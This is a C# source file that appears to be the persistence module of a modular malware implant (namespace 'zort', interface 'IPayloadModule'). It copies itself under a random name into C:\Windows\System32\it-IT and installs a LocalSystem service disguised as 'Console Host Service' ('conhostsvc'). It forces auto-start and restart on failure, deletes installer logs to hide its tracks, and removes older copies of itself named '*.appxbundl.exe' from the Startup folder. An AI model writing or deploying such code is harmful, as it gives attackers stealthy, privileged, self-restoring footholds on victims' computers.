using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.ServiceProcess;

namespace zort
{
    [RunInstaller(true)]
    public class ServiceInstaller : Installer
    {

        private readonly System.ServiceProcess.ServiceInstaller serviceInstaller;
        private readonly ServiceProcessInstaller processInstaller;

        public ServiceInstaller()
        {
            serviceInstaller = new System.ServiceProcess.ServiceInstaller();
            processInstaller = new ServiceProcessInstaller
            {
                Account = ServiceAccount.LocalSystem,
            };

            serviceInstaller.StartType = ServiceStartMode.Automatic;
            serviceInstaller.ServiceName = "conhostsvc";
            serviceInstaller.DisplayName = "Console Host Service";
            serviceInstaller.Description = "Provides console hosting capabilities for applications requiring background processing.";

            // Configure the service to always restart on failure
            serviceInstaller.ServicesDependedOn = new string[] { }; // Add dependencies if needed
            serviceInstaller.AfterInstall += (sender, args) =>
            {
                using (var process = new Process())
                {
                    process.StartInfo.FileName = "sc";
                    process.StartInfo.Arguments = $"failure \"{serviceInstaller.ServiceName}\" reset=0 actions=restart/5000";
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.UseShellExecute = false;
                    process.Start();
                    process.WaitForExit();
                }
            };

            Installers.Add(serviceInstaller);
            Installers.Add(processInstaller);
        }
    }

    public class ServiceManager : IPayloadModule
    {
        const bool DEBUG_REINSTALL = false;

        public ElevationType ElevationType => ElevationType.Elevated;

        public string ModuleName => "ServiceManager";

        public void Start()
        {
            //check if we are running as a service
            if (!Environment.UserInteractive)
            {
                ModuleLogger.Log(this, "Running in service mode. no need to install service. Not installing svc...");

                // Kill duplicate processes
                var currentProcess = Process.GetCurrentProcess();
                var duplicateProcesses = Process.GetProcessesByName(currentProcess.ProcessName)
                    .Where(p => p.Id != currentProcess.Id);
                foreach (var process in duplicateProcesses)
                {
                    ModuleLogger.Log(this, $"Killing duplicate process: {process.ProcessName} (PID: {process.Id})");
                    try
                    {
                        process.Kill();
                        process.WaitForExit();
                        ModuleLogger.Log(this, $"Killed duplicate process: {process.ProcessName} (PID: {process.Id})");
                    }
                    catch (Exception ex)
                    {
                        ModuleLogger.Log(this, $"Failed to kill duplicate process: {process.ProcessName} (PID: {process.Id}). Error: {ex.Message}");
                    }
                }

                // Remove old selves from startup
                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string[] oldSelves = Directory.GetFiles(startupFolder, "*.appxbundl.exe");
                foreach (string oldSelf in oldSelves)
                {
                    try
                    {
                        File.Delete(oldSelf);
                        ModuleLogger.Log(this, $"Deleted old self from startup: {oldSelf}");
                    }
                    catch (Exception ex)
                    {
                        ModuleLogger.Log(this, $"Failed to delete old self from startup: {oldSelf}. Error: {ex.Message}");
                    }
                }
            }

            try
            {
                // Check if the service is already installed
                var serviceName = "conhostsvc";
                var service = ServiceController.GetServices().FirstOrDefault(s => s.ServiceName.ToLower() == serviceName);
                if (service != null)
                {
                    if (DEBUG_REINSTALL)
                    {
                        ModuleLogger.Log(this, "DEBUG: Service is already installed. Reinstalling...");
                        // Uninstall the service
                        ModuleLogger.Log(this, "Stopping service...");
                        using (var sc = new ServiceController(serviceName))
                        {
                            if (sc.Status != ServiceControllerStatus.Stopped)
                            {
                                sc.Stop();
                                sc.WaitForStatus(ServiceControllerStatus.Stopped);
                            }
                        }
                        ModuleLogger.Log(this, "Uninstalling service...");
                        ManagedInstallerClass.InstallHelper(new string[] { "/u", Assembly.GetExecutingAssembly().Location });
                    }
                    else
                    {
                        ModuleLogger.Log(this, "Service is already installed.");
                        // Ensure that the service is running
                        using (var sc = new ServiceController(serviceName))
                        {
                            if (sc.Status != ServiceControllerStatus.Running)
                            {
                                ModuleLogger.Log(this, "Service is not running. Starting service...");
                                sc.Start();
                                sc.WaitForStatus(ServiceControllerStatus.Running);
                            }
                            else
                            {
                                ModuleLogger.Log(this, "Service is already running.");
                            }

                            // Ensure that the service is enabled and will run on startup   
                            using (var process = new Process())
                            {
                                process.StartInfo.FileName = "sc";
                                process.StartInfo.Arguments = $"config \"{serviceName}\" start=auto";
                                process.StartInfo.CreateNoWindow = true;
                                process.StartInfo.UseShellExecute = false;
                                process.Start();
                                process.WaitForExit();
                            }
                            sc.Refresh();
                        }

                        ModuleLogger.Log(this, "Exiting without installing service.");
                        Environment.Exit(0);
                        return;
                    }
                }

                // Check if running from C:\Windows\System32\it-IT\conhost.exe
                string itITPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32", "it-IT");
                string randomName = Path.GetRandomFileName() + ".exe";
                string conhostPath = Path.Combine(itITPath, randomName);
                string currentFolder = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                if (!currentFolder.Equals(itITPath))
                {
                    ModuleLogger.Log(this, "Not running from C:\\Windows\\System32\\it-IT\\conhost.exe. Copying and installing service..");

                    // Copy myself over to C:\Windows\System32\it-IT\conhost.exe
                    Directory.CreateDirectory(itITPath);
                    File.Copy(Assembly.GetExecutingAssembly().Location, conhostPath, true);
                }

                // Install the service
                ModuleLogger.Log(this, "Starting service installation...");
                ManagedInstallerClass.InstallHelper(new string[] { conhostPath });
                // Delete Log files ending with InstallLog and InstallState in current directory
                var logFiles = Directory.GetFiles(itITPath, "*.InstallLog");
                foreach (var logFile in logFiles)
                {
                    File.Delete(logFile);
                }
                logFiles = Directory.GetFiles(itITPath, "*.InstallState");
                foreach (var logFile in logFiles)
                {
                    File.Delete(logFile);
                }
                ModuleLogger.Log(this, "Service installation completed.");


                // Start the service
                ModuleLogger.Log(this, "Starting service...");
                using (var sc = new ServiceController(serviceName))
                {
                    // Ensure that the service is enabled and will run on startup
                    using (var process = new Process())
                    {
                        process.StartInfo.FileName = "sc";
                        process.StartInfo.Arguments = $"config \"{serviceName}\" start=auto";
                        process.StartInfo.CreateNoWindow = true;
                        process.StartInfo.UseShellExecute = false;
                        process.Start();
                        process.WaitForExit();
                    }

                    if (sc.Status != ServiceControllerStatus.Running)
                    {
                        sc.Start();
                        sc.WaitForStatus(ServiceControllerStatus.Running);
                    }


                    sc.Refresh();
                }
            }
            catch (Exception ex)
            {
                ModuleLogger.Log(this, $"Error installing service: {ex.Message}");
            }
            finally
            {
                // Exit the process
                ModuleLogger.Log(this, "Exiting process.");
                Environment.Exit(0);
            }
        }

        public void Stop()
        {
            //Dont do anything. this runs only once therefore does not need to be stopped
        }
    }
}
